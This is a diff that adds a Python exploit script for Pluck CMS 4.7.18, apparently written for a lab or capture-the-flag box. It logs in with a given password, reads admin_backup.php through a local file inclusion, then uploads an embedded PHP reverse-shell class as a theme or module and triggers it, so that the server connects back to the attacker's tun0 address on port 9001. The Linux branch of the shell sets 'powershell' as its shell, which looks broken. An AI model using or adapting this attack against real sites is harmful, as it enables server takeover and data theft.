@@ -1,0 +1,293 @@
+#!/bin/env python3
+# Pluck v4.7.18 LFI + RCE
+import os
+import argparse
+import requests
+import subprocess
+from zipfile import ZipFile
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+def get_tun0_ip():
+    try:
+        result = subprocess.run(
+            ["sh", "-c", r"ip a | grep -A 2 'tun0:' | grep -oP '(?<=inet\s)\d+(\.\d+){3}'"],
+            stdout=subprocess.PIPE,
+            text=True
+        )
+        ip_address = result.stdout.strip()
+        return ip_address if ip_address else None
+    except Exception as e:
+        print(f"Error getting tun0 IP: {e}")
+        return None
+
+theme_content = f"""
+<?php
+class Shell {{
+    private $addr  = null;
+    private $port  = null;
+    private $os    = null;
+    private $shell = null;
+    private $descriptorspec = array(
+        0 => array('pipe', 'r'), // shell can read from STDIN
+        1 => array('pipe', 'w'), // shell can write to STDOUT
+        2 => array('pipe', 'w')  // shell can write to STDERR
+    );
+    private $buffer  = 1024;
+    private $clen    = 0; 
+    private $error   = false;
+    public function __construct($addr, $port) {{
+        $this->addr = $addr;
+        $this->port = $port;
+    }}
+    private function detect() {{
+        $detected = true;
+        if (stripos(PHP_OS, 'LINUX') !== false) {{
+            $this->os    = 'LINUX';
+            $this->shell = 'powershell';
+        }} else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {{
+            $this->os    = 'WINDOWS';
+            $this->shell = 'powershell.exe';
+        }} else {{
+            $detected = false;
+            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
+        }}
+        return $detected;
+    }}
+    private function daemonize() {{
+        $exit = false;
+        if (!function_exists('pcntl_fork')) {{
+            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
+        }} else if (($pid = @pcntl_fork()) < 0) {{
+            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
+        }} else if ($pid > 0) {{
+            $exit = true;
+            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
+        }} else if (posix_setsid() < 0) {{
+            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
+        }} else {{
+            echo "DAEMONIZE: Completed successfully!\n";
+        }}
+        return $exit;
+    }}
+    private function settings() {{
+        @error_reporting(0);
+        @set_time_limit(0);
+        @umask(0);
+    }}
+    private function dump($data) {{
+        $data = str_replace('<', '&lt;', $data);
+        $data = str_replace('>', '&gt;', $data);
+        echo $data;
+    }}
+    private function read($stream, $name, $buffer) {{
+        if (($data = @fread($stream, $buffer)) === false) {{
+            $this->error = true;
+            echo "STRM_ERROR: Cannot read from ${{name}}, script will now exit...\n";
+        }}
+        return $data;
+    }}
+    private function write($stream, $name, $data) {{
+        if (($bytes = @fwrite($stream, $data)) === false) {{
+            $this->error = true;
+            echo "STRM_ERROR: Cannot write to ${{name}}, script will now exit...\n";
+        }}
+        return $bytes;
+    }}
+    private function rw($input, $output, $iname, $oname) {{
+        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{
+            if ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }}
+            $this->dump($data);
+        }}
+    }}
+    private function brw($input, $output, $iname, $oname) {{
+        $fstat = fstat($input);
+        $size = $fstat['size'];
+        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {{
+            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {{
+                $this->clen -= $bytes;
+                $size -= $bytes;
+            }}
+        }}
+        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {{
+            $size -= $bytes;
+            $this->dump($data);
+        }}
+    }}
+    public function run() {{
+        if ($this->detect() && !$this->daemonize()) {{
+            $this->settings();
+            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
+            if (!$socket) {{
+                echo "SOC_ERROR: {{$errno}}: {{$errstr}}\n";
+            }} else {{
+                stream_set_blocking($socket, false);
+                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
+                if (!$process) {{
+                    echo "PROC_ERROR: Cannot start the shell\n";
+                }} else {{
+                    foreach ($pipes as $pipe) {{
+                        stream_set_blocking($pipe, false);
+                    }}
+                    $status = proc_get_status($process);
+                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
+                    do {{
+						$status = proc_get_status($process);
+                        if (feof($socket)) {{ // check for end-of-file on SOCKET
+                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
+                        }} else if (feof($pipes[1]) || !$status['running']) {{
+                            echo "PROC_ERROR: Shell process has been terminated\n";   break;
+                        }}
+                        $streams = array(
+                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
+                            'write'  => null,
+                            'except' => null
+                        );
+                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
+                        if ($num_changed_streams === false) {{
+                            echo "STRM_ERROR: stream_select() failed\n"; break;
+                        }} else if ($num_changed_streams > 0) {{
+                            if ($this->os === 'LINUX') {{
+                                if (in_array($socket  , $streams['read'])) {{ $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }} // read from SOCKET and write to STDIN
+                                if (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }} // read from STDERR and write to SOCKET
+                                if (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }} // read from STDOUT and write to SOCKET
+                            }} else if ($this->os === 'WINDOWS') {{
+                                if (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }} // read from SOCKET and write to STDIN
+                                if (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }} // read from STDERR and write to SOCKET
+                                if (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }} // read from STDOUT and write to SOCKET
+                            }}
+                        }}
+                    }} while (!$this->error);
+                    foreach ($pipes as $pipe) {{
+                        fclose($pipe);
+                    }}
+                    proc_close($process);
+                }}
+                fclose($socket);
+            }}
+        }}
+    }}
+}}
+echo '<pre>';
+$sh = new Shell('{ get_tun0_ip() }', 9001);
+$sh->run();
+unset($sh);
+echo '</pre>';
+?>
+"""
+
+theme_info = "<?php $themedir = 'pwned'; $themename = 'pwned'; ?>"
+
+session = requests.Session()
+
+def login(url,psw):
+    LOGIN_URL = url + "login.php"
+    headers = {"Referer": LOGIN_URL}
+    data = {'cont1': psw, 'bogus': '', 'submit': 'Log in'}
+    response = session.post(LOGIN_URL, headers=headers, data=data)
+    if response.status_code == 200:
+        print("[+] Login successful")
+        return True
+    else:
+        print("[-] Login problem. response code:", response.status_code)
+        return False
+
+def theme_zip(name):
+    WEBSHELL_PATH = './theme.php'
+    INFO_PHP_PATH = './info.php'
+    with open(WEBSHELL_PATH, 'w') as file:
+        file.write(theme_content)
+    with open(INFO_PHP_PATH, 'w') as file:
+        file.write(theme_info)
+    with ZipFile(name + '.zip', 'w') as zipf:
+        zipf.write(WEBSHELL_PATH)
+        zipf.write(INFO_PHP_PATH)
+    print("[+] Theme Zipped")
+
+def module_zip(name):
+    WEBSHELL_PATH = f'./{name}/{name}.php'
+    os.makedirs(name, exist_ok=True)
+    with open(WEBSHELL_PATH, 'w') as file:
+        file.write(theme_content)
+    with ZipFile(f'{name}.zip', 'w') as zipf:
+        zipf.write(WEBSHELL_PATH, arcname=os.path.join(f'{name}/', name + '.php'))
+    print("[+] Module Zipped")
+
+def theme_set(url,name):
+    THEME_URL = url + "admin.php?action=theme"
+    headers = {"Referer": THEME_URL}
+    data = {'cont1': name, 'save': 'Save'}
+    response = session.post(THEME_URL, headers=headers, data=data)
+    if response.status_code == 200:
+        print("[+] Theme setup successful")
+        return True
+    else:
+        print("[-] Theme setup problem. Response code:", response.status_code)
+        return False
+
+def theme_check(url, name):
+    response = session.get(url + "/data/themes/" + name + "/")
+    return response.status_code == 200
+
+def lfi(url, file):
+    response = session.post(url + 'data/modules/albums/albums_getimage.php?image=' + file)
+    if response.status_code == 200:
+        print(response.text)
+    else:
+        print(f"[-] Failed to LFI. Status code: {response.status_code}")
+
+def upload(url, name, action):
+    UPLOAD_URL = url + "admin.php?action=" + action
+    with open(name + '.zip', 'rb') as file:
+        multipart_data = MultipartEncoder(
+            fields={
+                'sendfile': (name + '.zip', file, 'application/zip'),
+                'submit': 'Upload'
+            }
+        )
+        headers = {
+            "Referer": UPLOAD_URL,
+            'Content-Type': multipart_data.content_type
+        }
+        response = session.post(UPLOAD_URL, headers=headers, data=multipart_data)
+        if response.status_code == 200:
+            print("[+] Upload successful")
+            return True
+        else:
+            print("[-] Upload problem. Response code:", response.status_code)
+            return False
+
+def run(url, path):
+    response = session.post(url + path)
+    if response.status_code == 200:
+        print(response.text)
+    else:
+        print(f"[-] Failed to execute command. Status code: {response.status_code}")
+
+if __name__ == '__main__':
+    try:
+        parser = argparse.ArgumentParser(description="Manage theme installation and operations.")
+        parser.add_argument('-n', '--name', default='pwn', help='Name of the theme to process.')
+        parser.add_argument('-u', '--url', required=True, help='Url of the pluck website.')
+        parser.add_argument('-p', '--password', required=True, help='Password for login authentication.')
+        parser.add_argument('-r', '--rev', action='store_true', help='Activate reverse shell PHP to tun0:9001.')
+        parser.add_argument('-t', '--type', choices=['theme', 'module'], default='module', help='Specify the upload type.')
+        args = parser.parse_args()
+        login(args.url,args.password)
+        print("[+] "+ args.url + 'admin_backup.php')
+        lfi(args.url ,'admin_backup.php')
+        if args.type == 'theme':
+            theme_zip(args.name)
+        elif args.type == 'module':
+            module_zip(args.name)
+        if args.rev:
+            while not theme_check(args.url ,args.name):
+                if args.type == 'theme':
+                    upload(args.url ,args.name, 'themeinstall')
+                    theme_set(args.url ,args.name)
+                    run(args.url, '')
+                else:
+                    upload(args.url ,args.name, 'installmodule')
+                    run(args.url,'data/modules/' + args.name + '/' + args.name + '.php')
+    except KeyboardInterrupt:
+        print("[-] Exit")
+        exit(0)
